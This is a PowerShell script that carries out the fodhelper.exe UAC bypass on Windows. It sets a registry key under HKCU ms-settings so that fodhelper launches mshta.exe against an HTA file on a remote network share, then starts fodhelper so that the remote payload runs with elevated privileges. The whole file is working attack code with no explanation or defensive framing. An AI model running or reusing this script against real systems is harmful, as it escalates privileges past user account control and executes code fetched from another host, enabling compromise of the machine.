# Define registry paths and command
$settings = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
$cmd = "cmd /c start mshta.exe \\192.168.17.135\MyShare\Downloads\infow.hta"
$del = ""

# Attempt to create the registry key
try {
    New-Item -Path $settings -Force | Out-Null
    Write-Host "Successfully created registry key"
} catch {
    Write-Host "Failed to create registry key"
}

# Set the registry values
try {
    Set-ItemProperty -Path $settings -Name "(default)" -Value $cmd
    Write-Host "Successfully set registry value"
} catch {
    Write-Host "Failed to set registry value"
}

try {
    Set-ItemProperty -Path $settings -Name "DelegateExecute" -Value $del
    Write-Host "Successfully set registry value: DelegateExecute"
} catch {
    Write-Host "Failed to set registry value: DelegateExecute"
}

# Start the fodhelper.exe program with elevated privileges
$sei = New-Object -TypeName System.Diagnostics.ProcessStartInfo
$sei.FileName = "C:\Windows\System32\fodhelper.exe"
$sei.Verb = "runas"
$sei.UseShellExecute = $true

try {
    $process = [System.Diagnostics.Process]::Start($sei)
    Write-Host "Successfully created process =^..^="
} catch {
    $err = $_.Exception.HResult
    if ($err -eq -2147467259) {
        Write-Host "The user refused to allow privileges elevation."
    } else {
        Write-Host "Unexpected error! Error code: $err"
    }
}
